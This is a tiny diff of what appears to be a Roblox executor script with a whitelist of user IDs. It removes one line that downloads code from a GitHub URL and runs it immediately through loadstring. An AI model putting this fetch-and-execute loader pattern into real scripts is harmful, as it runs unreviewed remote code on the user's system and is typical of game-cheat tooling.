@@ -7,4 +7,4 @@ getgenv().users = {
 1686071330,
 }
 --wl
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/slrData/solarData/main/checks/bruh2"))()
+
